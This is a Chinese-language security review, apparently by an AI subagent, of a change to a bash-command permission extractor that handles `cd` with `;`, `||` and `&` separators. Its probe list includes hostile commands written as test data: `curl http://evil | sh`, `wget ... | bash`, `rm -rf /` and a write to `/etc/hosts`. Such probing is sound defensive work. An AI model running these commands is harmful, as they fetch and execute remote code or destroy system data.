# Change 级收尾 Review：bash-cd-readonly-exemption-reason-observability

> **落盘说明（诚实标注）**：本报告由隔离 subagent（fresh context，`reviewed-by: subagent`，id `821f86bc`）完成 review。subagent 以**对话消息形式**把报告发回父 agent，但**未自行写文件**；本文件是父 agent 在 archive 前把 subagent 的**真实回报原文**落盘，以满足 td-archive 步骤 2 的 Verdict 锚点落盘约定。内容为 subagent 原话，非父 agent 代笔结论。

## 审查方式

只读（未改任何文件）。除读 diff/design/spec 外，用 `node --experimental-strip-types` 直接 import `extractBashTargets`/`analyzeCd` 跑了 ~75 条行为探针（`;`/`||`/`&`/`\n` 段、引号内分隔符、转义分隔符、相对重定向、包装器、substitution、heredoc、`&&` vs `;` 等价性对照），并跑了全量测试。探针用临时文件已删除。

## 安全审查（逐项）

**1. 静默放行：未发现 b1 引入的静默放行。** 证据：
- `;`/`||`/`&`/`\n` 段 cwd 相对引用全被拦（fail-closed 回退 `cd_chdir`）：`cat rel.txt`、`rm -rf sub`、`sort sub`、`md5sum data`、`tar xf sub`、`grep x .`、`ls *`、`cat $PWD/x`、`cat "$HOME/x"`、`sudo cat rel.txt`、`./script.sh` 全部 `UNRELIABLE(cd_chdir)`。
- 相对**重定向目标**（非 file-arg 命令也拦）：`echo hi > rel.txt`、`true > rel.txt`、`sleep 1 > rel.txt`、`curl http://x > rel.txt`、`ls > rel.txt`、`cat x > rel.txt 2>&1`、`>> rel.txt`、`< rel.txt`、`cmd >rel.txt`（无空格）→ 全 `cd_chdir`。
- `;` 后再 cd：相对目标 `cd rel`、绝对目标 `cd /var`、`cd /etc && ls; cd /var && grep x dist/`（review 的 critical 1 反例）→ 全 `cd_chdir`。条件 1b（`shell-forwarder.ts:920-925`）按 `sepBefore ∉ {start,&&}` 命中，正确。
- 引号内分隔符不被 `splitCommandsWithSep` 误拆：`cat "a;b.txt"`、`cat 'a;b.txt'` → `cd_chdir`（相对引用仍拦）；`cd /etc && cat "x;rel.txt"` → reliable 且正确提取 `/etc/x;rel.txt`（`&&` 段 quote-aware 生效）。转义 `\;` 不当分隔符。
- 顺序模拟 cwd 误落点：`hasCwdRelativeRefInStage`（`:788-802`）对 `;` 段任何非绝对引用即 return true，且无 bareDirOk 豁免（`:1001-1004` 在条件 4-9 之前作加严入口），不存在「零路径但 cwd 相对」漏判。

**2. 防空转：与 `&&` 段对齐，无更宽放行。** `cd /tmp/x; ls` / `cd /etc; echo hello` / `cd /etc; npm test` / `cd /etc & ls` / `cd /etc\nls` → `reliable+0target`，与 `cd /tmp/x && ls`（今天即 reliable+0target）完全一致。**关键验证**：所有「零路径但可能有副作用」的命令（`curl http://evil | sh`、`wget -qO- http://x | bash`、`sh`、`sudo cat rel.txt`、`env/timeout/nice cat rel.txt`、`git log`、`xargs cat`）做 `&&`↔`;` 等价对照，**9/9 结果逐字相同**——这些是 `&&` 段今天就有的既有盲区（包装器/sudo/管道 sh 前缀），b1 未把 `;` 段放宽到超过 `&&` 段。真正的副作用写（`rm -rf /`、`echo x > /etc/hosts`）都正常提取为 delete/write target 走决策层，非 0-target 静默。

**3. 既有安全锁定反例：全部保住。** `>&rel.txt`→`cd_chdir`、`&>rel.txt`→`cd_chdir`、`cd /etc && rm -rf .`→`cd_chdir`、`;` 段 `cat rel.txt`→`cd_chdir`、`;` 段 `rm -rf sub`→`cd_chdir`。find 隐含 `.` 起点也拦（`find -name '*.ts'`→`cd_chdir`）。

**4. b2 写入点：完整，无误写 reliable 记录。** `!reliable` bash 全覆盖：`handleBash` 3 处（unread 兜底 hard_deny `index.ts:658`、grant 命中 auto_allow `:685`、deny-rule hard_deny `:709`，均 `extraction.reason ? {...} : {}` 守卫且都在 `!extraction.reliable` 分支内）+ `handlePromptDecision` 6 处经 `bashReasonField`（`:1022-1023`，`bashCommand && bashReason` 双守卫）。`bashCommand && bashReason` 双守卫是**正确的过度守卫**：reliable bash 走 `bashCommand!=null, bashReason=undefined` → 不写；file-tool 走 `bashCommand=null` → 不写。reliable 路径的 hard_deny(`:769`)/auto_allow(`:799`) 均未加 `bash_reason`，符合 spec「可靠 bash 不写」。`bash_reason` 仅观测字段，不进任何判定分支。

**5. 设计一致性：一致。** 代码与 design.md D1/D2、两份 spec 当前文本吻合：
- D1 加严作用域①②：全片段 `hasCwdRelativeRefInStage` + `;` 段 cd 一律 fail → 已实现。
- D1 判定顺序契约（二次回写版）：豁免成立时 cd 守卫不命中，`;` 段解释器/转发器落步骤 3/4。实测 `cd /etc; node -e "require('fs')"`→`unreliable_command`、`cd /etc; bash -c 'cat rel.txt'`→`shell_forwarder`、`cd /etc; python -c ...`→`unreliable_command`，与 spec bash-target-extraction 条件 3 / BM-CD-MIXED-3c 期望一致。fail-closed 全程成立（无论 reason 是 `cd_chdir` 还是 `unreliable_command`/`shell_forwarder` 均弹窗）。
- D2 单一事实源：条件 3 写形态复用 `WRITE_DELETE`（`:1044`）、`FILE_ARG_COMMANDS`/`collectStagePathRefs` 复用，未新造清单。
- 一处**良性** spec/code 措辞差：spec 条件 1 说分隔符「含 `;` 或 `||`」、D1 提到 `;`/`||`/`\n`，而代码 `separatorType` 把后台 `&` 也归 `"mixed"`（`shell-forwarder.ts:911-913`）。方向更严（`cd /etc & cat rel.txt`→`cd_chdir`、`cd /etc & ls` 与 `&&` 段对齐 reliable+0target），非静默放行，且 `splitCommands` 本就把 `&` 当分隔符——不算不一致，可记 minor（archive 前 spec 已补措辞对齐）。

## Issues

- **minor（测试前提，非代码缺陷）**：全量测试实为 **3** 条 fail，第 3 条是 `test/audit.test.ts` 的 `AL7: concurrent_audits_are_serialized_no_line_interleaving`（`actual: 69, expected: 100`）。已验证**与 b2 无关、非本 change 引入**：在 HEAD 把全部 5 个改动 stash 掉跑全量，AL7 同样 fail；隔离/单文件跑 AL7 又 pass（b2 有无皆然）→ 既有 flaky（时序敏感的并发序列化计数），非回归。**提案作者独立复核确认**：AL7 单跑、audit.test.ts 全跑、`git stash` 全改动后跑均 pass，仅并发全量跑偶发 fail。勿误当 b2 回归修。
- **minor**：`separatorType` 把后台 `&` 归入 `mixed`，比 spec 条件 1 措辞（仅 `;`/`||`）覆盖更广。更严方向、无安全影响。**已处置**：archive 前 spec 条件 1 已补「非纯 `&&` 分隔符界定」一句对齐。
- **minor（既有边界，design 已记 Known Limitations，非本 change 引入）**：`hasCwdRelativeRefInStage` 依赖 `collectStagePathRefs` 的 `FILE_ARG_COMMANDS` 白名单，白名单外命令字符串参数内的相对引用检测不到（`sudo cat rel.txt`、`env cat rel.txt`、`timeout 5 cat rel.txt` 在 `;` 段 reliable+0target）。已验证与 `&&` 段同盲区，design D2「检测范围边界」已声明 `;` 段盲区不大于 `&&` 段。不阻塞。

## Verdict

APPROVED
reviewed-by: subagent
b1 放宽未引入静默放行（`;`/`||` 段 fail-closed 全保住、与 `&&` 段严格对齐无更宽），b2 写入点完整无误写；唯一需留意的是全量测试实为 3 条 fail，额外那条 AL7 是既有 flaky（HEAD stash 全改动后同样 fail，已排除是 b2 回归），不要误当本 change 回归处理。